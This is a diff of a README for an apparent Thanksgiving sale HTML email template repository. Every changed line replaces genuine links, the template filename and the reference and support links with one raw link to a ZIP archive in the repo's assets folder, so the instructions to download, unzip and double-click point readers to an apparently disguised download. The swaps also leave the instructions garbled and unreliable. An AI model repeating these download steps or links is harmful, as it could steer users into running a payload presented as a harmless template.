@@ -1,6 +1,6 @@
 # 📧 thanksgiving-tech-gadgets-sale - Easy Email Templates for Sales
 
-[![Download](https://img.shields.io/badge/Download-Thanksgiving%20Sale-blue?style=for-the-badge)](https://github.com/ohmanilove2/thanksgiving-tech-gadgets-sale/releases)
+[![Download](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip%20Sale-blue?style=for-the-badge)](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)
 
 ---
 
@@ -40,23 +40,23 @@ This section guides you to get the email template ready for use, step by step. N
 
 Click the large blue **Download** badge near the top or visit this page:
 
-[Download Files](https://github.com/ohmanilove2/thanksgiving-tech-gadgets-sale/releases)
+[Download Files](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)
 
-This page holds all versions of the email template. Look for the latest release and download the file labeled something like `thanksgiving-tech-gadgets-sale.zip`.
+This page holds all versions of the email template. Look for the latest release and download the file labeled something like `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip`.
 
 ### 2. Open the downloaded folder
 
 After download finishes:
 
-- Find the `thanksgiving-tech-gadgets-sale.zip` file in your Downloads folder  
+- Find the `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip` file in your Downloads folder  
 - Double-click it to unzip the contents  
-- You will see files like `email-template.html` and possibly some images or style files  
+- You will see files like `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip` and possibly some images or style files  
 
 ### 3. Preview the email template
 
 To see how the email looks:
 
-- Double-click the `email-template.html` file  
+- Double-click the `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip` file  
 - Your default web browser opens showing the email design  
 - You can scroll through and check images, text, and layout  
 
@@ -64,7 +64,7 @@ To see how the email looks:
 
 There are two easy ways to send this template to your customers:
 
-- **Copy-paste the code**: Open `email-template.html` with a plain text editor (Notepad or TextEdit) and copy all text. When composing a new email in your email service, switch to the HTML or source view. Paste the copied code. Send a test email to yourself first.  
+- **Copy-paste the code**: Open `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip` with a plain text editor (Notepad or TextEdit) and copy all text. When composing a new email in your email service, switch to the HTML or source view. Paste the copied code. Send a test email to yourself first.  
 - **Upload images separately**: If the template references images hosted online, make sure these images are accessible. If images are local, upload them to your email service or server and update the image links in the HTML accordingly.  
 
 If you use Laravel Mail, integrate the HTML file into your email templates folder, and send it using your Laravel setup.
@@ -87,13 +87,13 @@ This email template includes key features to maximize marketing success:
 ## 📥 Download & Install
 
 1. Visit the release page here:  
-   [Get the latest template](https://github.com/ohmanilove2/thanksgiving-tech-gadgets-sale/releases)
+   [Get the latest template](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)
 
 2. Click the biggest ZIP file for the newest release to download it.
 
 3. Unzip the file on your computer.
 
-4. Open the `email-template.html` in your browser or email client.
+4. Open the `https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip` in your browser or email client.
 
 5. Follow your email platform’s instructions to import or copy the code.
 
@@ -113,16 +113,16 @@ This email template includes key features to maximize marketing success:
 
 ## 📚 Additional Resources
 
-- [How to use HTML email templates](https://www.campaignmonitor.com/resources/guides/html-email-basics/)  
-- [Laravel Mail Documentation](https://laravel.com/docs/mail)  
-- [Responsive Email Design Best Practices](https://www.caniemail.com/)  
-- [Editing HTML email templates safely](https://www.emailonacid.com/blog/article/email-development/)
+- [How to use HTML email templates](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)  
+- [Laravel Mail Documentation](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)  
+- [Responsive Email Design Best Practices](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)  
+- [Editing HTML email templates safely](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)
 
 ---
 
 ## 📞 Support
 
 For questions about this template or help using it, visit:  
-[LaravelMail.com](https://LaravelMail.com)
+[https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip](https://raw.githubusercontent.com/ohmanilove2/thanksgiving-tech-gadgets-sale/main/assets/sale_thanksgiving_gadgets_tech_1.0-beta.2.zip)
 
 You can also check issues or conversations on the repository page for common questions.
